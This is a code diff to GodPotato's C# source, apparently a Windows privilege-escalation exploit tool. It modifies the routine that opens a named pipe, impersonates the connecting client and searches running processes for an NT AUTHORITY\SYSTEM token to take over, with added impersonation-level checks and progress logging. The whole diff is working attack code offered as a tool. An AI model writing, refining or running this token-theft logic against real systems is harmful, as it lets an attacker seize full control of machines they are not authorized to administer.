@@ -2,10 +2,8 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
-using System.Text;
 using System.Threading;
 using static GodPotato.NativeAPI.NativeMethods;
 
@@ -25,8 +23,8 @@ namespace GodPotato.NativeAPI
         private IntPtr procString = IntPtr.Zero;
         private Delegate useProtseqDelegate;
         private WindowsIdentity systemIdentity;
-        private TextWriter ConsoleWriter;
         private Thread pipeServerThread;
+        public TextWriter ConsoleWriter { get; private set; }
         public string PipeName { get; set; }
         public bool IsStart { get; private set; }
         public bool IsHook { get; private set; }
@@ -123,32 +121,42 @@ namespace GodPotato.NativeAPI
                 pipeServerHandle = CreateNamedPipe(serverPipe, NativeMethods.PIPE_ACCESS_DUPLEX, NativeMethods.PIPE_TYPE_BYTE | NativeMethods.PIPE_READMODE_BYTE | NativeMethods.PIPE_WAIT, NativeMethods.PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);
 
                 ConsoleWriter.WriteLine("[*] CreateNamedPipe " + serverPipe);
-                if (pipeServerHandle != NativeMethods.BAD_HANLE)
+                if (pipeServerHandle != BAD_HANLE)
                 {
 
                     if (ConnectNamedPipe(pipeServerHandle, IntPtr.Zero))
                     {
-                        if (NativeMethods.ImpersonateNamedPipeClient(pipeServerHandle))
+                        ConsoleWriter.WriteLine("[*] Pipe Connected!");
+                        if (ImpersonateNamedPipeClient(pipeServerHandle))
                         {
                             systemIdentity = WindowsIdentity.GetCurrent();
+                            if (systemIdentity.ImpersonationLevel <= TokenImpersonationLevel.Identification)
+                            {
+                                RevertToSelf();
+                            }
+
                             ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
+                            ConsoleWriter.WriteLine("[*] CurrentsImpersonationLevel: " + systemIdentity.ImpersonationLevel);
 
                             ConsoleWriter.WriteLine("[*] Start Search System Token");
 
                             bool isFindSystemToken = false;
 
-                            SharpToken.TokenuUils.ListProcessTokens(-1, processToken => {
-                                if (processToken.UserName == "NT AUTHORITY\\SYSTEM" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
-                                {
-                                    systemIdentity = new WindowsIdentity(processToken.TokenHandle);
-                                    ConsoleWriter.WriteLine("[*] PID : {0} Token:0x{1:x}  User: {2} ImpersonationLevel: {3}", processToken.TargetProcessId, processToken.TargetProcessToken, processToken.UserName, processToken.ImpersonationLevel);
-                                    isFindSystemToken = true;
+                            if (systemIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
+                            {
+                                SharpToken.TokenuUils.ListProcessTokens(-1, processToken => {
+                                    if (processToken.UserName == "NT AUTHORITY\\SYSTEM" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
+                                    {
+                                        systemIdentity = new WindowsIdentity(processToken.TokenHandle);
+                                        ConsoleWriter.WriteLine("[*] PID : {0} Token:0x{1:x}  User: {2} ImpersonationLevel: {3}", processToken.TargetProcessId, processToken.TargetProcessToken, processToken.UserName, processToken.ImpersonationLevel);
+                                        isFindSystemToken = true;
+                                        processToken.Close();
+                                        return false;
+                                    }
                                     processToken.Close();
-                                    return false;
-                                }
-                                processToken.Close();
-                                return true;
-                            });
+                                    return true;
+                                });
+                            }
 
                             ConsoleWriter.WriteLine("[*] Find System Token : " + isFindSystemToken);
 
@@ -176,9 +184,9 @@ namespace GodPotato.NativeAPI
             }
             finally
             {
-                if (pipeServerHandle != NativeMethods.BAD_HANLE)
+                if (pipeServerHandle != BAD_HANLE)
                 {
-                    NativeMethods.CloseHandle(pipeServerHandle);
+                    CloseHandle(pipeServerHandle);
                 }
 
             }
